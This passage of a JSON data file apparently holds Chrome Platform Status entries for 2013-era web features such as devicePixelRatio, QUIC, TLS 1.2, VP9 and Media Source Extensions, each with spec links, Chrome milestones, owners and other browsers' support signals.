        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#dom-window-devicepixelratio",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=809788",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 31
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 31,
        "blink_components": [
          "Blink"
        ],
        "desktop": 31,
        "flag": false,
        "android": 31,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=177836",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn265030",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/www-style/2013Nov/0349.html",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Update window.devicePixelRatio on full page zoom so that it accurately portraitists the ratio between css and device pixels.",
    "id": 5269993591668736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/devicePixelRatio"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:32.801960",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "DOM3 mouseenter & mouseleave Events",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/dom3events/raw-file/tip/html/DOM3-Events.html#events-mouseevents",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/10#DOM3_Events",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 30
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 30,
        "flag": false,
        "bug": "http://crbug.com/236215",
        "intervention": false
      },
      "opera": {
        "android": 17,
        "desktop": 17
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/ms536945",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/149173",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "MouseEvents dispatched when a pointing device is moved onto or off of an Element or one of its descendents. Similar to mouseover and mouseout respectively, but are not cancelable and are not dispatched more than one \"round-trip\" into an Element's boundary.",
    "id": 4889528208719872,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Events/mouseenter",
        "https://developer.mozilla.org/en-US/docs/Web/Events/mouseleave"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:45.228060",
      "by": "ericbidelman@google.com"
    },
    "name": "imageSmoothingEnabled attribute for CanvasRenderingContext2D",
    "comments": "Previously this attribute was named as webkitImageSmoothingEnabled. The unprefixed alias was shipped since Chrome 30.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#dom-context-2d-imagesmoothingenabled",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/docs/Web/API/CanvasRenderingContext2D/imageSmoothingEnabled",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 30
        },
        "owners": [
          "junov@chromium.org",
          "xlai@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 30,
        "blink_components": [
          "Blink"
        ],
        "desktop": 30,
        "flag": false,
        "android": 30,
        "bug": "http://crbug.com/277199",
        "intervention": false
      },
      "opera": {
        "android": 17,
        "desktop": 17
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/dn265062(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The CanvasRenderingContext2D.imageSmoothingEnabled attribute can be set to change if images are smoothed. It is true by default. On getting the imageSmoothingEnabled property, the last value it was set to, is returned.",
    "id": 5639849247768576,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:30.451160",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS Device Adaptation",
    "comments": "The development of the feature started in WebKit, before Blink was created and is already referred to from Chrome documentation:\r\n\r\nhttps://developers.google.com/chrome-developer-tools/docs/mobile-emulation\r\n\r\n\r\nOpera shipped in Presto 2.8, before switching to WebKit and later Blink:\r\n\r\nhttp://www.opera.com/docs/specs/presto28/css/viewportdeviceadaptation/",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://dev.w3.org/csswg/css-device-adapt/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 29
        },
        "owners": [
          "rune@opera.com",
          "kenneth.r.christiansen@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 29,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": true,
        "android": 29,
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh708740(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The @viewport rule, in combination with media queries, enabled web developers to optimize the layout of sites and apps for different devices with minimal effort.\r\n\r\nIt generalizes the viewport meta tag to CSS, while being much simpler to understand and without the quirks that exists with the meta tag.",
    "id": 4737164243894272,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:08.703230",
      "by": "ericbidelman@google.com"
    },
    "name": "Media Queries: resolution feature",
    "comments": "http://blog.chromium.org/2013/07/chrome-29-beta-web-audio-and-webrtc-in.html\r\n\r\nImplemented since IE9 along with dpi unit. It currently lacks dppx and dpcm units.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/css3-mediaqueries/#resolution",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "owners": [
          "kenneth.r.christiansen@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "bug": "http://crbug.com/158744",
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "url": "http://ie.microsoft.com/testdrive/HTML5/CSS3MediaQueries/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=78087",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows to query the device pixel count per CSS unit",
    "id": 5944509615570944,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Media_queries#resolution"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:35.443270",
      "by": "ericbidelman@google.com"
    },
    "name": "Proprietary marquee value",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 29
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "overflow: -webkit-marquee",
    "id": 5067649092419584,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:39.351650",
      "by": "ericbidelman@google.com"
    },
    "name": "QUIC",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://docs.google.com/a/chromium.org/document/d/1RNHkx_VvKWyWg6Lr8SZ-saqsQx7rFV-ev2jRFUoVD34/edit",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "owners": [
          "rch@chromium.org",
          "jar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An experimental, UDP-based QUIC transport protocol",
    "id": 5338403830759424,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:29.156920",
      "by": "ericbidelman@google.com"
    },
    "name": "Sending Messages to Extensions",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "owners": [
          "kalman@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "bug": "http://crbug.com/55316",
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Expose a Chrome-specific API to allow websites to send messages to extensions. Only exposed to websites whitelisted by an installed extension.",
    "id": 4670450516885504,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:37.550040",
      "by": "ericbidelman@google.com"
    },
    "name": "TLS 1.2",
    "comments": "http://en.wikipedia.org/wiki/Transport_Layer_Security",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://tools.ietf.org/html/rfc5246",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=861266",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "owners": [
          "agl@chromium.org",
          "wtc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "android": 29,
        "bug": "http://crbug.com/90392",
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The latest version of the Transport Layer Security (TLS) protocol. Uses asymmetric cryptography to assure who is communicating, and to exchange a symmetric key. This session key is then used to encrypt data flowing between the parties. This allows for data/message confidentiality, and message authentication codes for message integrity and as a by-product message authentication.",
    "id": 5197666342404096,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 06:05:22.189830",
      "by": "Patket@microsoft.com"
    },
    "name": "VP9",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://tools.ietf.org/html/draft-grange-vp9-bitstream",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=VP9",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "android": 29,
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/vp9videoplayback/?q=vp9",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "VP9 is an open and royalty free video compression standard.",
    "id": 6362186595172352,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:12.920260",
      "by": "ericbidelman@google.com"
    },
    "name": "XMLHttpRequest timeout",
    "comments": "Contributed tests to W3C: https://github.com/w3c/web-platform-tests/pull/91\r\n\r\nFeature mentioned in Chrome Beta 29 announcement: http://blog.chromium.org/2013/07/chrome-29-beta-web-audio-and-webrtc-in.html",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/xhr/raw-file/tip/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=525816#c78",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 29
        },
        "owners": [
          "dominik.rottsches@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 29,
        "flag": false,
        "android": 29,
        "bug": "http://crbug.com/231959",
        "intervention": false
      },
      "opera": {
        "android": 16,
        "desktop": 16
      },
      "edge": {
        "view": {
          "url": "http://dev.opera.com/articles/view/xhr2/#xhrtimeouts",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=99478",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Exposing the XHR timeout property and sending corresponding events such as ontimeout.",
    "id": 6290890138058752,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-25 06:03:21.518350",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "CSS Conditional Rules",
    "comments": "WebKit ticket: https://bugs.webkit.org/show_bug.cgi?id=86146  ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/css-conditional/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/22#CSS",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 28
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 28,
        "flag": false,
        "android": 28,
        "bug": "http://crbug.com/140487",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/conditionalrules/?q=conditional",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support for the @supports at-rule and the \"window.CSS.supports()\" API",
    "id": 4993981813358592,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@supports",
        "https://developer.mozilla.org/en-US/docs/Web/API/CSS/supports"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-25 06:02:20.631400",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "<template> Element",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/scripting-1.html#the-template-element",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://bugzil.la/818976",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 26
        },
        "owners": [
          "rafaelw@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 26,
        "blink_components": [
          "Blink"
        ],
        "desktop": 26,
        "flag": false,
        "android": 26,
        "bug": "http://crbug.com/164794",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=123851",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "HTML template element to allow creating fragment of inert HTML as a prototype for stamping out DOM.",
    "id": 5207287069147136,
    "resources": {
      "docs": [
        "http://www.html5rocks.com/tutorials/webcomponents/template/",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:06.187420",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS Gradients",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css3-images/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 25
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 25,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Gradients provide a method to, over a customizable amount of space, transition from one color to another.",
    "id": 5785905063264256,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Using_CSS_gradients"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:06.272950",
      "by": "ericbidelman@google.com"
    },
    "name": "Resource Timing API",
    "comments": "Demo: simpl.info/resourcetiming",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3c-test.org/webperf/specs/ResourceTiming/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=822480",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 25
        },
        "owners": [
          "simonjames@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 25,
        "flag": false,
        "bug": "http://crbug.com/159544",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows web applications to access timing information related to HTML elements.",
    "id": 5796350423728128,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:35.399150",
      "by": "ericbidelman@google.com"
    },
    "name": "User Timing API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/UserTiming/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 25
        },
        "owners": [
          "simonjames@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 25,
        "flag": false,
        "bug": "http://crbug.com/159547",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://blogs.msdn.com/b/ie/archive/2013/02/26/ie10-for-windows-7-globally-available-for-consumers-and-businesses.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Helps web developers measure the performance of their applications by giving them access to high precision timestamps.",
    "id": 5066549580791808,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:07.807870",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Speech API (input)",
    "comments": "Demo: simpl.info/stt",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://dvcs.w3.org/hg/speech-api/raw-file/tip/speechapi.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 25
        },
        "owners": [
          "tommi@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 25,
        "flag": false,
        "android": 31,
        "bug": "http://crbug.com/123688",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/webspeechapiinput",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables web developers to incorporate speech recognition into their web pages.",
    "id": 5908775487668224,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:39.576850",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "performance.now()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/HighResolutionTime/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/15#DOM",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 24
        },
        "owners": [
          "simonjames@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 24,
        "flag": false,
        "android": 25,
        "bug": "http://crbug.com/158638",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/hh973355",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/166595",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Enables reliable, high-resolution timing of client-side performance.",
    "id": 5349124069130240,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance/now"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:38.051830",
      "by": "ericbidelman@google.com"
    },
    "name": "requestAnimationFrame()",
    "comments": "Safari lacks support for the DOMHightResTimeStamp callback parameter.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/default/specs/RequestAnimationFrame/Overview.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 24
        },
        "owners": [
          "jamesr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 24,
        "flag": false,
        "bug": "http://crbug.com/158676",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Offload animation repainting to browser for optimized performance. You should call this method whenever you're ready to update your animation onscreen. This will request that your animation function be called before the browser performs the next repaint.",
    "id": 5233400470306816,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:27.460820",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Media Source Extensions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/media-source/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=778617",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 23
        },
        "owners": [
          "wolenetz@chromium.org",
          "hbengali@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 23,
        "flag": false,
        "android": 30,
        "bug": "http://crbug.com/144669",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/bg182646#mse",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://www.jwplayer.com/html5/mediasource/",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows appending data to an <audio>/<video> element.",
    "id": 4563797888991232,
    "resources": {
      "docs": [
